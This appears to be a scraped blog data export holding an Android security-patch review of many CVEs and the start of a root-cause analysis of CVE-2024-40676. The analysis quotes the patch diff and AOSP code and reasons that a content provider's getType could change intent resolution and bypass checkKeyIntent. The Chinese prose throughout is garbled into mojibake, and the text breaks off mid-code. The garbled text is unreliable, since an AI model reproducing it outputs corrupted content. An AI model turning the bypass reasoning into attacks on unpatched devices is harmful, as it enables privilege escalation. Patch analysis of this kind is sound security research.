13+ã€‚çœ‹äº†çœ¼è‡´è°¢ä¿¡æ¯ï¼Œæœç„¶æ˜¯ MichaÅ‚ Bednarskiã€‚CVE-2024-49738 EoP High 1Parcel::writeInplace() åœ¨å†™å…¥æ•°æ®ä¹‹å‰å…ˆæ ¡éªŒæ•°æ®ã€‚æ²¡å¤ªçœ‹æ‡‚å’‹è§¦å‘ï¼Œçœ‹æè¿°æ˜¯è¶Šç•Œå†™ã€‚CVE-2024-49744 EoP High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚AccountManagerService checkKeyIntentParceledCorrectly é‡Œåªæ£€æŸ¥äº† intent çš„ç±»å‹ï¼Œæ²¡æœ‰æ£€æŸ¥å†æ¬¡ååºåˆ—åŒ–å intent çš„ç±»å‹ï¼Œå¯ä»¥é€šè¿‡ bundle mismatch çš„æ–¹å¼ç»•è¿‡ã€‚å…³äºç»•è¿‡äº†æœ‰ä»€ä¹ˆç”¨ï¼Œå¯ä»¥æŸ¥çœ‹è¿™ä¸€ç¯‡ï¼š https://konata.github.io/posts/creator-mismatch/æ³¨ï¼šè¿™ä¸ªæ¼æ´çœ‹èµ·æ¥å¾ˆæ˜æ˜¾ï¼Œä½†å®é™…ä¸Šå¹¶ä¸å¥½åˆ©ç”¨ï¼ŒChooseTypeAndAccountActivity æˆ–è€… AddAccountSettings ç­‰å¸¸è§åˆ©ç”¨ç‚¹éƒ½å·²ç»åœ¨ä¹‹å‰çš„ CVE-2023-20944 è·Ÿ CVE-2023-21124 çš„è¡¥ä¸é‡ŒåŠ ä¸Šäº† new Intent ä½¿å¾—æˆ‘ä»¬ä¼ªé€ çš„ intent å¹¶ä¸ä¼šç›´æ¥ä¼ é€’ç»™ startActivityã€‚é‚£ä¹ˆå¦‚ä½•è§¦å‘è¿™ä¸ªæ¼æ´å‘¢ï¼Ÿè¿™é‡Œå…ˆç•™ä¸€ä¸ªæ‚¬å¿µï¼Œè¯»è€…å¯ä»¥è‡ªå·±å…ˆæ€è€ƒæ€è€ƒã€‚CVE-2024-49745 EoP High 1Parcel::growData ä¸­å¦‚æœç°åœ¨çš„ data position å·²ç»å¤§äº data size å°±ç›´æ¥è¿”å›ã€‚çœ‹æ¼æ´æè¿°æ˜¯è¶Šç•Œå†™ã€‚CVE-2023-40108 ID High 1SettingsProvider ä¸­è®¾ç½®é“ƒå£°çš„æ—¶å€™æ ¡éªŒè¿™ä¸ª URI ç¡®å®æ˜¯ä¸€ä¸ªéŸ³é¢‘æ–‡ä»¶ã€‚è¿½ä»£ç å¯ä»¥çœ‹è§åé¢ä¼šè¯»å–è¿™ä¸ª URI æŠŠå®ƒå†™è¿›ä¸€ä¸ª cache dir é‡Œï¼Œè¿™é‡Œæ˜¯ä»¥ SettingsProvider çš„æƒé™å»è¯»å–ï¼ŒSettingsProvider è·‘åœ¨ system_server é‡Œæ‰€ä»¥æ˜¯ system æƒé™ï¼Œç„¶åè¿™ä¸ª cache file å¯ä»¥é€šè¿‡è°ƒç”¨ SettingsProvider çš„ openFile() æ‰“å¼€ï¼Œè¿”å›ä¸€ä¸ª InputStream è€Œä¸éœ€è¦ä»»ä½•æƒé™ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯ä¸€ä¸ªä»¥ç³»ç»Ÿæƒé™è¯»å–ä»»æ„ URIã€‚å¾ˆæ—©å°±çŸ¥é“çš„è€é—®é¢˜äº†ï¼Œå±äºæœ‰ç”Ÿä¹‹å¹´ç³»åˆ—ï¼Œæœ€æ—©åº”è¯¥æ˜¯ CVE-2022-20353 åœ¨ Settings è°ƒç”¨é“ƒå£°é€‰æ‹©å™¨çš„æ—¶å€™åŠ äº†æ ¡éªŒï¼Œçœ‹ä»£ç å¯ä»¥å‘ç° com.android.dialer.app.settings.DefaultRingtonePreference ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ï¼ˆè¿™ä¸ªæœˆçš„ CVE-2023-40132ï¼‰ï¼Œè€Œä¸”é“ƒå£°å±äº Settings.System ç»„ï¼Œå¯ä»¥è¢«æ‹¿åˆ°è¯»å†™ç³»ç»Ÿè®¾ç½®æƒé™çš„ app æ‰‹åŠ¨è§¦å‘ã€‚è¿™æ¬¡åœ¨æ ¹æºä¸Šä¿®å¤äº†ï¼Œåº”è¯¥ä¸ä¼šå†æœ‰é—®é¢˜äº†ã€‚CVE-2024-49733 ID High 1æ­¤æ¼æ´ç”±æˆ‘å‘ç°å¹¶æŠ¥å‘Šã€‚Settings çš„ ServiceListing å§‹ç»ˆæ˜¾ç¤ºè¢«å¯ç”¨äº†çš„æœåŠ¡ï¼Œä¿è¯ç”¨æˆ·ä¹Ÿèƒ½çœ‹è§æœ‰äº›æ ¡éªŒä¸é€šè¿‡ä½†æ˜¯å·²ç»è¢«å¯ç”¨çš„æœåŠ¡ã€‚æ„Ÿè§‰ç±»å‹ç»™é”™äº†ï¼Œåº”è¯¥ç»™ EoP çš„Media FrameworkCVE-2023-40132 EoP High 1 2è·Ÿä¸Šé¢çš„ CVE-2023-40108 æ˜¯ä¸€ä¸ªé—®é¢˜ï¼Œä¸å†é‡å¤è§£é‡Šäº†ã€‚è¿™ä¸ªè¡¥ä¸æ¯”ä¸Šé¢é‚£ä¸ªè¡¥ä¸æ›´æ—©ï¼Œæ˜¯åœ¨è¿è¡Œåœ¨å®¢æˆ·ç«¯çš„ RingtoneManager é‡Œä¹ŸåŠ ä¸Šæ–‡ä»¶ç±»å‹æ£€æŸ¥ï¼Œåº”è¯¥æ˜¯ç»™ com.android.dialer æˆ–è€…å…¶ä»– app çš„æƒ…å†µç”¨çš„ã€‚ä¸Šé¢é‚£ä¸ªè¡¥ä¸åº”è¯¥ä¹Ÿèƒ½è¦†ç›–è¿™ä¸ªæ¼æ´çš„æƒ…å†µã€‚Systemè“ç‰™å¼€ä¼šäº†å±äºæ˜¯å¾…åˆ†ææ¼æ´ï¼šCVE-2024-49742 CVE-2024-49734CVE-2024-43096 RCE Critical 1è“ç‰™ GATT åè®®æ ˆ build_read_multi_rsp å‡½æ•°ä¸­ MTU ç­‰äº 0 æ—¶çš„è¶Šç•Œå†™å…¥ï¼Œè¡¥ä¸åˆ¤æ–­äº†è¿™ç§æƒ…å†µç›´æ¥è¿”å›ã€‚CVE-2024-43770 RCE CriticalCVE-2024-43771 RCE CriticalCVE-2024-49747 RCE CriticalCVE-2024-49748 RCE Critical1å››ä¸ªæ¼æ´éƒ½åœ¨ GATT é‡Œï¼Œåœ¨å››ä¸ªä¸åŒçš„åœ°æ–¹éƒ½æ²¡æœ‰æ£€æŸ¥ gatt_tcb_get_payload_size çš„è¿”å›å€¼æ˜¯ä¸æ˜¯ 0ï¼Œè€Œè¿™ä¸ªå‡½æ•°åœ¨ channel å·²ç»è¢«å…³é—­çš„æ—¶å€™ä¼šè¿”å› 0ï¼Œåœ¨åç»­é€ æˆè¶Šç•Œå†™ã€‚å½±å“å‡½æ•°ï¼šCVE-2024-43770 gatts_process_find_infoCVE-2024-43771 gatts_process_read_reqCVE-2024-49747 gatts_process_read_by_type_reqCVE-2024-49748 gatts_process_primary_service_reqCVE-2024-49749 RCE High 1giflib è§£æ gif çš„è¿‡ç¨‹ä¸­ï¼Œåˆ¤æ–­ width å’Œ height æ˜¯å¦éæ³•çš„ if è¯­å¥å­˜åœ¨é€»è¾‘é”™è¯¯ï¼Œå˜æˆäº†åªæœ‰ä¸‰é¡¹æ¡ä»¶å…¨éƒ¨æˆç«‹æ‰è®¤ä¸ºæ–‡ä»¶éæ³•ï¼Œåº”è¯¥æ˜¯ä¸‰é¡¹æ¡ä»¶é‡Œåªè¦æœ‰ä¸€é¡¹æˆç«‹å°±ä¸ºéæ³•ã€‚å¯¼è‡´åç»­è®¡ç®— size çš„æ—¶å€™å‘ç”Ÿæ•´æ•°æº¢å‡ºè¿›è€Œè¶Šç•Œå†™ã€‚CVE-2024-34722 EoP High 1è“ç‰™é…å¯¹è¿‡ç¨‹ä¸­çš„æˆæƒç»•è¿‡é—®é¢˜ï¼Œå»å¹´è¡¥ä¸å°±æ”¾è¿‡ä¸€æ¬¡ï¼Œçœ‹èµ·æ¥æ˜¯æ²¡ä¿®å¤å®ŒCVE-2024-34730 EoP High 1è“ç‰™ HID é“¾æ¥è¿‡ç¨‹ä¸­çš„æƒé™ç»•è¿‡é—®é¢˜CVE-2024-43095 EoP High 1æ”¹çš„åœ°æ–¹å¾ˆå¤šï¼Œçœ‹èµ·æ¥æ˜¯åŠ¨æ€æ·»åŠ çš„æƒé™ç›¸å…³çš„è‡ªåŠ¨æˆæƒé—®é¢˜In multiple locations, there is a possible way to obtain any system permission due to a logic error in the code. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.12345Fix Dynamic Permission group auto grant behaivorFix the Dynamic Permission group auto grant behaivor so that apermission group is only considered granted when (1) all permissionswere auto-granted or (2) a platform permission in the same group isgranted.CVE-2024-43765 EoP High 1æ‚¬æµ®çª—è¦†ç›–æ¼æ´å†æ¬¡é™æ—¶å›å½’ã€‚Document UI è¿™ä¸ª app é‡Œéšè—é®ç›–çª—ä½“ï¼Œé˜²æ­¢ç‚¹å‡»åŠ«æŒã€‚CVE-2024-43763 DoS High 1ä¸€ä¸ªè“ç‰™çš„é€»è¾‘ bugï¼Œåº”è¯¥åªä¼šé€ æˆåŠŸèƒ½å¼‚å¸¸ï¼ŸCVE-2024-49736 DoS High 1ç¦æ­¢åœ¨ DSU æ¨¡å¼ä¸‹æ¢å¤å‡ºå‚è®¾ç½®ã€‚å¯èƒ½æ˜¯å› ä¸º DSU ç”¨çš„ data ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸ä¼šå†è¦æ±‚è¾“å…¥ä¸€éé”å±å¯†ç ï¼Ÿ","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"å®‰å…¨","slug":"å®‰å…¨","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8/"},{"name":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","slug":"å®‰å…¨è¡¥ä¸åˆ†ææ ç›®","permalink":"https://blog.canyie.top/tags/%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90%E6%A0%8F%E7%9B%AE/"}]},{"title":"Self-changing Data Type - CVE-2024-40676 æ¼æ´åˆ†æ","slug":"self-changing-data-type","date":"2024-11-07T02:00:00.000Z","updated":"2025-04-24T10:33:02.825Z","comments":true,"path":"2024/11/07/self-changing-data-type/","link":"","permalink":"https://blog.canyie.top/2024/11/07/self-changing-data-type/","excerpt":"ä»Šå¹´ 10 æœˆä»½çš„æ—¶å€™ï¼ŒAndroid å®‰å…¨å…¬å‘Šç”¨ CVE-2024-40676 çš„ç¼–å·å…¬å¸ƒäº†ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ patchã€‚AccountManagerService checkKeyIntent() è´Ÿè´£æ£€æŸ¥ account authenticator ä¼ å›çš„ intentï¼Œç¡®ä¿å®ƒå®‰å…¨å†ä¼ å›ç»™ callerï¼Œé˜²æ­¢ launch anywhere æ¼æ´ã€‚è¿™ä¸ªè¡¥ä¸çœ‹èµ·æ¥å¾ˆæš´åŠ›ä¹Ÿå¾ˆå¥‡æ€ªï¼Œç›´æ¥ ban äº†æ‰€æœ‰å¸¦æœ‰ content URI çš„ intentï¼Œä¼¼ä¹å®Œå…¨ä¸è€ƒè™‘å…¼å®¹æ€§ã€‚æ˜¯ä»€ä¹ˆæ ·çš„æ¼æ´æ‰è¦ä¸Šå¦‚æ­¤æš´åŠ›çš„ä¿®å¤æ–¹æ³•ï¼Ÿæ³¨ï¼šå¦‚ä¸‹å…¨æ˜¯æˆ‘çš„çŒœæµ‹ï¼Œç”±äºè”ç³»ä¸åˆ°æ¼æ´ä½œè€…æœ¬äººï¼Œæ— æ³•ç¡®è®¤è¿™æ˜¯å¦å°±æ˜¯åŸæœ¬çš„é—®é¢˜ã€‚","text":"ä»Šå¹´ 10 æœˆä»½çš„æ—¶å€™ï¼ŒAndroid å®‰å…¨å…¬å‘Šç”¨ CVE-2024-40676 çš„ç¼–å·å…¬å¸ƒäº†ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„ patchã€‚AccountManagerService checkKeyIntent() è´Ÿè´£æ£€æŸ¥ account authenticator ä¼ å›çš„ intentï¼Œç¡®ä¿å®ƒå®‰å…¨å†ä¼ å›ç»™ callerï¼Œé˜²æ­¢ launch anywhere æ¼æ´ã€‚è¿™ä¸ªè¡¥ä¸çœ‹èµ·æ¥å¾ˆæš´åŠ›ä¹Ÿå¾ˆå¥‡æ€ªï¼Œç›´æ¥ ban äº†æ‰€æœ‰å¸¦æœ‰ content URI çš„ intentï¼Œä¼¼ä¹å®Œå…¨ä¸è€ƒè™‘å…¼å®¹æ€§ã€‚æ˜¯ä»€ä¹ˆæ ·çš„æ¼æ´æ‰è¦ä¸Šå¦‚æ­¤æš´åŠ›çš„ä¿®å¤æ–¹æ³•ï¼Ÿæ³¨ï¼šå¦‚ä¸‹å…¨æ˜¯æˆ‘çš„çŒœæµ‹ï¼Œç”±äºè”ç³»ä¸åˆ°æ¼æ´ä½œè€…æœ¬äººï¼Œæ— æ³•ç¡®è®¤è¿™æ˜¯å¦å°±æ˜¯åŸæœ¬çš„é—®é¢˜ã€‚1234567891011121314diff --git a/services/core/java/com/android/server/accounts/AccountManagerService.java b/services/core/java/com/android/server/accounts/AccountManagerService.javaindex b45bcb4..b59a5ea 100644--- a/services/core/java/com/android/server/accounts/AccountManagerService.java+++ b/services/core/java/com/android/server/accounts/AccountManagerService.java@@ -4959,6 +4959,9 @@ if (resolveInfo == null) &#123; return false; &#125;+ if (\"content\".equals(intent.getScheme())) &#123;+ return false;+ &#125; ActivityInfo targetActivityInfo = resolveInfo.activityInfo; int targetUid = targetActivityInfo.applicationInfo.uid; PackageManagerInternal pmi = LocalServices.getService(PackageManagerInternal.class);åˆ†æå‰ç½®çŸ¥è¯†ï¼šlaunch anywhere æ¼æ´ï¼Œè¿™é‡Œæ¨èå‡ ç¯‡è§£æï¼šretmeï¼šlaunchAnyWhere: Activityç»„ä»¶æƒé™ç»•è¿‡æ¼æ´è§£æ(Google Bug 7699048)clang è£ç¼åº—ï¼šLaunchAnyWhere æ¼æ´ç°ä¸–ï¼šGoogle Bug 7699048 å¤ç°ä¸åˆ†æ(Android4.3)è¯»è€…ä¹Ÿå¯ä»¥è‡ªå·±ä¸Šç½‘æœç´¢ã€‚çŒœæƒ³ï¼šURI grantï¼Ÿåˆçœ‹è¿™ä¸ªè¡¥ä¸ï¼Œè™½ç„¶æäº¤ä¿¡æ¯éå¸¸è°œè¯­äººï¼Œä½†å¾ˆæ˜æ˜¾å®ƒå’Œ content URI ç›¸å…³ï¼Œè€Œä¸”å¾ˆæ˜æ˜¾è¿™ä¸ª intent æœ€åä¼šè¢«è¿”å›ç»™è°ƒç”¨è€…è¿›è¡Œ startActivityï¼Œå¾ˆå®¹æ˜“èƒ½æƒ³åˆ°çš„å°±æ˜¯ URI grantã€‚ç„¶è€Œè¿™ä¸ªçŒœæƒ³è¢«å®˜æ–¹å…¬å¸ƒçš„ä¿¡æ¯å¦å†³äº†ï¼Œä»å…¶ä»–åœ°æ–¹æ‹¿åˆ°äº†è¿™ä¸ªæ¼æ´çš„æè¿°å’ŒæŠ¥å‘ŠåŸæ ‡é¢˜ï¼Œå…¶ä¸­ Summary æ˜¯æŠ¥å‘Šæ ‡é¢˜ï¼ŒDetails æ˜¯å®˜æ–¹ç»™å‡ºçš„æ¼æ´æè¿°ï¼šSummary: In AccountManagerServiceâ€™s checkKeyIntent method there is a possible way to bypass Intent check and lead to LaunchAnyWhere on All Android versionDetails: In checkKeyIntent of AccountManagerService.java, there is a possible way to bypass intent security check and install an unknown app due to a confused deputy. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.è™½ç„¶ä»ç„¶æ˜¯è°œè¯­äººï¼Œä½†å…¶ä¸­å‡ºç°äº† Launch Anywhere å’Œ install an unknown app å­—çœ¼ï¼Œæ˜¾ç„¶è¿™ä¸å¯èƒ½æ˜¯å•çº¯çš„ URI grant èƒ½å®Œæˆçš„äº‹ã€‚æ€è·¯è‡ªæ­¤ä¸­æ–­äº†â€¦â€¦å—ï¼ŸæŠ½ä¸å‰¥èŒ§ï¼šå½±å“ resolveActivity æµç¨‹ï¼Ÿå¦‚æœä½ å¯¹ AccountManagerService åŠ 2014 å¹´ Launch Anywhere æ¼æ´è¶³å¤Ÿç†Ÿæ‚‰ï¼Œä½ åº”è¯¥ä¼šçŸ¥é“è¡¥ä¸ checkKeyIntent() çš„è¯¦ç»†å®ç°ã€‚ç®€å•æ¥è¯´ï¼Œå®ƒå…ˆæ£€æŸ¥äº† Bundle ä¸­çš„ intent åœ¨ååºåˆ—åŒ–å‰åä¸€è‡´ï¼Œç„¶åè°ƒç”¨ resolveActivityAsUser() æ£€æŸ¥è¯¥ intent æŒ‡å‘çš„ activity æ˜¯å¦èƒ½å¯åŠ¨ï¼Œæ‰€æœ‰æ£€æŸ¥é€šè¿‡åæ‰ä¼šè¿”å› bundle è®©è°ƒç”¨è€…è¿›è¡Œ startActivityã€‚åŸºäºä¸Šè¿°æ¼æ´ä¿¡æ¯ï¼Œå†ç»“åˆè¡¥ä¸åŠä¸Šä¸‹æ–‡ç»†èŠ‚ï¼Œæˆ‘ä»¬æš‚æ—¶å¾—å‡ºå¦‚ä¸‹ç»“è®ºï¼šå®ƒèƒ½ç»•è¿‡ checkKeyIntent() é‡Œçš„å®‰å…¨æ£€æŸ¥ä»è€Œå¯åŠ¨ä¸å®‰å…¨çš„ activityå®ƒéœ€è¦åœ¨ intent ä¸­è®¾ç½®ä¸€ä¸ª content URI ä½œä¸º data æ‰èƒ½å®ç°ï¼ˆåºŸè¯ï¼‰ï¼Œè€Œä¸”å¾ˆå¯èƒ½åªéœ€è¦è¿™ä¸€æ­¥æˆ–è€…è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼Œå¦åˆ™ä¸è‡³äºä¸Šè¿™ç§æš´åŠ›è¡¥ä¸å¾ˆå¯èƒ½ä¸æ˜¯ bundle mismatch ç±»é—®é¢˜ï¼Œç†ç”±ï¼šä½œè€…è¡¨ç¤ºæ­¤æ¼æ´èƒ½åœ¨æ‰€æœ‰ Android ç‰ˆæœ¬ä¸Šè§¦å‘ï¼Œè€Œæˆ‘ä¸ªäººæƒ³ä¸åˆ°åº”è¯¥æ€ä¹ˆç»•è¿‡ Lazy Bundle åŠ checkKeyIntentParcelledCorrectly() ä¸¤é‡ç¼“è§£æªæ–½ï¼Œè€Œä¸”è€ƒè™‘åˆ°è¿™ä¸ªè¡¥ä¸åªä¼šåœ¨ intent != null æ—¶è§¦å‘ï¼Œå¦‚æœæ˜¯ bundle mismatch çš„è¯ï¼Œç›´æ¥è®©å®ƒåœ¨ AccountManagerService ä¸­æ‹¿åˆ° null å³å¯ç»•è¿‡ã€‚ä»è¿™ä¸€ç‚¹æˆ‘ä»¬è¿˜å¯ä»¥æ¨å‡º AccountManagerService ä¸ caller æ‹¿åˆ°çš„ intent åº”è¯¥æ˜¯ç›¸åŒçš„ã€‚åŸºäº 3 æˆ‘ä»¬å‡è®¾è¿™é‡Œæ²¡æœ‰ self-changing Bundle ç­‰æŠ€æœ¯ä¼šå½±å“åˆ° intent æœ¬èº«ï¼Œå¾€ä¸‹æ¨å¾— AccountManagerService å’Œ caller æ‹¿åˆ°çš„ intent ç›¸åŒï¼Œé‚£å‰©ä¸‹çš„å°±åªæœ‰ä¸€ç‚¹å¯ä»¥æ€€ç–‘ï¼šéš¾é“æ˜¯ AccountManagerService resolveActivity() åˆ°çš„ç»“æœä¸ caller å®é™…è°ƒç”¨ startActivity å¯åŠ¨çš„ activity å­˜åœ¨å·®å¼‚ï¼ŸIntent Filter Data Mimetypeå¦‚æœè¯»è€…æœ‰åŒ»å­¦ç›¸å…³çš„ç»éªŒï¼Œåº”è¯¥ä¼šçŸ¥é“åŒ»å­¦ä¸Šæœ‰ä¸ªâ€œä¸€å…ƒè®ºâ€ï¼Œå³å¯¹äºç—…äººçš„å¤šç§ç—‡çŠ¶æˆ–ç°è±¡ï¼Œé¦–å…ˆå°è¯•ç”¨å•ä¸€çš„ä¸€ç§ç–¾ç—…å»è§£é‡Šæ‰€æœ‰ç—‡çŠ¶ï¼Œè€Œä¸æ˜¯å•ç‹¬ç‰‡é¢å»çœ‹å¾…æ¯ä¸ªç—‡çŠ¶å°†å…¶è®¤ä¸ºæ˜¯å¤šä¸ªç–¾ç—…å åŠ è€Œæˆã€‚æˆ‘ä»¬è¿™é‡Œå°è¯•æ ¹æ®æœ‰é™çš„ä¿¡æ¯å»å°è¯•æ‰¾å‡ºé—®é¢˜æ‰€åœ¨ï¼Œå’ŒåŒ»ç”Ÿè¯Šæ–­ç–¾ç—…å¾ˆåƒï¼Œä¹Ÿå¯ä»¥å°è¯•ç”¨è¿™ç§æ€ç»´å»æ€è€ƒã€‚ç¿»çœ‹ startActivity() çš„æµç¨‹ï¼Œå¯ä»¥å‘ç°å®ƒè§£æç›®æ ‡ç»„ä»¶ä¹Ÿæ˜¯ç”¨çš„ resolveActivity()ï¼Œå¦‚æœè¯´ä¸¤è¾¹å­˜åœ¨å·®å¼‚ï¼Œå…ˆåŸºäºä¸€å…ƒè®ºå‡è®¾ PackageManagerService resolveActivity() æœ¬èº«è¢«æ­£ç¡®å®ç°æ²¡æœ‰ bugï¼Œé‚£ä¹ˆä¸€å®šæ˜¯ä¸¤ä¸ªè°ƒç”¨ä¸­é—´æœ‰ä»€ä¹ˆä¸œè¥¿è¢«æ”¹å˜äº†ï¼Œå³æˆ‘ä»¬è¯´çš„ TOCTTOU é—®é¢˜ã€‚ä½†æ˜¯è¿™æ ·æˆ‘ä»¬è¿˜æ˜¯æ²¡ä»€ä¹ˆå¤´ç»ªï¼Œå› ä¸ºèƒ½å¤Ÿå½±å“ intent è§£æç»“æœçš„å› ç´ å¤ªå¤šäº†ã€‚å¦‚æœä¸Šè¿°æƒ…å†µå‘ç”Ÿï¼Œé‚£ä¹ˆå‡ ä¹å¯ä»¥è‚¯å®šè¿™ä¸ª intent ä¸€å®šæ˜¯ä¸€ä¸ªéšå¼ intentï¼ˆæ˜¾å¼ intent è¿ç»„ä»¶åéƒ½è®¾ç½®å¥½äº†ï¼Œæ²¡ä»€ä¹ˆæ“ä½œä½™åœ°ï¼‰ï¼›å†è€ƒè™‘åˆ°è¡¥ä¸ä¸­çš„ content uri dataï¼Œå¯ä»¥å¤§èƒ†å‡è®¾ï¼Œcontent uri ä¼šå½±å“éšå¼ intent è§£ææµç¨‹ï¼Œå¯¼è‡´ä¸¤æ¬¡è§£æåˆ°ä¸ä¸€æ ·çš„ç»“æœã€‚æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç»„ä»¶åªæœ‰å£°æ˜äº† intent filter è€Œä¸”åŒ¹é…ï¼Œæ‰æœ‰å¯èƒ½è¢«é€‰ä¸­ä¸ºéšå¼ intent çš„ç›®æ ‡ã€‚ç¿»çœ‹ intent filter çš„æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°å…¶å®å®ƒæ˜¯æ”¯æŒé€šè¿‡ intent data æ¥åŒ¹é…çš„ï¼Œåªéœ€è¦å£°æ˜ä¸€ä¸ª data æ ‡ç­¾ï¼š123456789&lt;data android:scheme=\"string\" android:host=\"string\" android:port=\"string\" android:path=\"string\" android:pathPattern=\"string\" android:pathPrefix=\"string\" android:pathSuffix=\"string\" android:pathAdvancedPattern=\"string\" android:mimeType=\"string\" /&gt;è¿™é‡Œå…¶å®è¿˜æ¼äº†ä¸€äº›å±æ€§ï¼Œæ¯”å¦‚ android:ssp è¿™ä¸ªå±æ€§å°±æ²¡æåˆ°ã€‚é‡Œé¢çš„å¤§éƒ¨åˆ†å±æ€§ï¼Œæ¯”å¦‚ schemeã€host è¿™ç§åŸºæœ¬ä¸Šéƒ½æ˜¯ç›´æ¥ä» URI String ä¸­è§£æå‡ºæ¥çš„ï¼Œè€Œæ ¹æ®ä¸Šè¿°çš„åˆ†æï¼Œæ”»å‡»è€…åº”è¯¥æ˜¯æ²¡æ³•è®© data è¿™ä¸ª uri æœ¬èº«å‘ç”Ÿæ”¹å˜çš„ï¼ˆå¦åˆ™ç›´æ¥æ”¹æ‰ scheme å°±ç›´æ¥ç»•è¿‡è¡¥ä¸äº†ï¼‰ï¼Œæ‰€ä»¥åº”è¯¥è·Ÿæœ¬æ¼æ´æ²¡å¤šå¤§å…³è”ã€‚çœ‹èµ·æ¥èƒ½æäº›åå ‚çš„å°±åªæœ‰æœ€åçš„ mimeType å±æ€§ï¼Ÿè‡³äºä»€ä¹ˆæ˜¯ Mime Type ä¸äº†è§£çš„è¯»è€…å¯ä»¥è‡ªè¡Œç™¾åº¦ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†ã€‚è¿™é‡Œå¼•å…¥äº†ä¸€ä¸ªå¾ˆæœ‰è¶£çš„é—®é¢˜ï¼Œæˆ‘ä»¬çŸ¥é“å¯¹äº file:///sdcard/abc.txt æˆ‘ä»¬å¯ä»¥ä¸€çœ¼çœ‹å‡ºæ¥å®ƒçš„ mime type æ˜¯ text/plainï¼Œè€Œå¯¹äº content URIï¼Œå®ƒçš„å€¼éœ€è¦è°ƒç”¨å…¶æŒ‡å‘çš„ content provider æ‰èƒ½è·å¾—ï¼Œé‚£ä¹ˆå®ƒçš„ type æ˜¯æ€ä¹ˆæ‹¿åˆ°çš„å‘¢ï¼Ÿç­”æ¡ˆå¾ˆç®€å•ï¼šä¹Ÿæ˜¯è°ƒç”¨ content provider è·å–ã€‚æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œ ContentProvider æœ‰ä¸€ä¸ªä¸“é—¨çš„ getType() æ–¹æ³•ç”¨æ¥è¿”å› mime typeã€‚å› ä¸ºå®ƒæ˜¯ä¸»åŠ¨è°ƒç”¨æˆ‘ä»¬è‡ªå·±æ‰èƒ½å¾—åˆ°ç»“æœï¼Œæ¢å¥è¯è¯´ä¹Ÿå°±æ˜¯ç»“æœæ˜¯é€šè¿‡æ‰§è¡Œæˆ‘ä»¬è‡ªå·±è‡ªå®šä¹‰çš„ä»£ç å¾—åˆ°çš„ï¼Œè¿™é‡Œå…¶å®æ“ä½œç©ºé—´å°±å¾ˆå¤§äº†ã€‚è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ª type ä¼šè¢«å®é™…ç”¨åœ¨è§£ææµç¨‹ä¸­å—ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚ç®€å•è¿½ä¸€ä¸‹ resolveActivity() çš„æµç¨‹ï¼Œç”šè‡³ä¸ç”¨è¿½è¿› system server é‡Œå°±èƒ½çœ‹è§:123456789101112@Overridepublic ResolveInfo resolveActivityAsUser(Intent intent, ResolveInfoFlags flags, int userId) &#123; try &#123; return mPM.resolveIntent( intent, intent.resolveTypeIfNeeded(mContext.getContentResolver()), updateFlagsForComponent(flags.getValue(), userId, intent), userId); &#125; catch (RemoteException e) &#123; throw e.rethrowFromSystemServer(); &#125;&#125;123456789101112131415161718192021/** * Return the MIME data type of this intent, only if it will be needed for * intent resolution. This is not generally useful for application code; * it is used by the frameworks for communicating with back-end system * services. * * @param resolver A ContentResolver that can be used to determine the MIME * type of the intent's data. * * @return The MIME type of this intent, or null if it is unknown or not * needed. */public @Nullable String resolveTypeIfNeeded(@NonNull ContentResolver resolver) &#123; // Match logic in PackageManagerService#applyEnforceIntentFilterMatching(...) if (mComponent != null &amp;&amp; (Process.myUid() == Process.ROOT_UID || Process.myUid() == Process.SYSTEM_UID || mComponent.getPackageName().equals(ActivityThread.currentPackageName()))) &#123; return mType; &#125; return resolveType(resolver);&#125;12345678910111213141516171819202122232425/** * Return the MIME data type of this intent. If the type field is * explicitly set, that is simply returned. Otherwise, if the data is set, * the type of that data is returned. If neither fields are set, a null is * returned. * * @param resolver A ContentResolver that can be used to determine the MIME * type of the intent's data. * * @return The MIME type of this intent. * * @see #getType * @see #resolveType(Context) */public @Nullable String resolveType(@NonNull ContentResolver resolver) &#123; if (mType != null) &#123; return mType; &#125; if (mData != null) &#123; if (\"content\".equals(mData.getScheme())) &#123; return resolver.getType(mData); &#125; &#125; return null;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * Return the MIME type of the given content URL. * * @param url A Uri identifying content (either a list or specific type), * using the content:// scheme. * @return A MIME type for the content, or null if the URL is invalid or the type is unknown */@Overridepublic final @Nullable String getType(@NonNull Uri url) &#123; Objects.requireNonNull(url, \"url\"); try &#123; if (mWrapped != null) return mWrapped.getType(url); &#125; catch (RemoteException e) &#123; return null; &#125; IContentProvider provider = null; try &#123; provider = acquireProvider(url); &#125; catch (Exception e) &#123; // if unable to acquire the provider, then it should try to get the type // using getTypeAnonymous via ActivityManagerService &#125; if (provider != null) &#123; try &#123; final StringResultListener resultListener = new StringResultListener(); provider.getTypeAsync(mContext.getAttributionSource(), url, new RemoteCallback(resultListener)); resultListener.waitForResult(CONTENT_PROVIDER_TIMEOUT_MILLIS); if (resultListener.exception != null) &#123; throw resultListener.exception; &#125; return resultListener.result; &#125; catch (RemoteException e) &#123; // Arbitrary and not worth documenting, as Activity // Manager will kill this process shortly anyway. return null; &#125; catch (java.lang.Exception e) &#123; Log.w(TAG, \"Failed to get type for: \" + url + \" (\" + e.getMessage() + \")\"); return null; &#125; finally &#123; try &#123; releaseProvider(provider); &#125; catch 